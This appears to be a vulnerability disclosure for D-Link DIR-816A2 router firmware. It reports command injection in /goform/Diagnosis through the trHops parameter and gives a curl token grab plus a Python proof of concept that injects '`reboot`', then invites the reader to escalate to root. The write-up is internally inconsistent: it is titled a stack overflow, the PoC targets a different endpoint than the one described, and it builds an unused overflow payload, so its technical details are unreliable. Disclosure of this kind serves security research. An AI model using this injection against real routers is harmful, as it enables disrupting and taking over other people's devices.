# DIR-816A2_FWv1.10CNB05_R1B011D88210.img Stack overflow vulnerability

## Overview

- Manufacturer's address：http://www.dlink.com.cn/
- Firmware download address ： http://www.dlink.com.cn/techsupport/ProductInfo.aspx?m=DIR-816

## Affected version

Below is the latest firmware

![](img/1.png#center)

## Vulnerability details

Vulnerability occurs in /goform/Diagnosis. When doType is 9 and pingAddr isn't 0.0.0.0, trHops will be spliced into v10 by snprintf, and finally system will be executed, resulting in a command injection vulnerability

![](img/2.png#center)

## Vulnerability verify

![](img/3.png#center)

![](img/4.png#center)

![](img/5.png#center)

## POC

Gets the token ID

```
curl http://192.168.0.1/dir_login.asp | grep tokenid
```

Run poc

```python
import requests


tokenid = ''

url = 'http://192.168.0.1/goform/form2Dhcpip.cgi'

payload = b'a' * 10000

data = {
    'tokenid': tokenid,
    'pingAddr': '192.168.0.1',
    'doType': '9',
    'trHops': '`reboot`'
}

print('payload sending...')
r = requests.post(url, data)
print('end')
```

You can see that the router restarts, and finally you can write an exp to get root.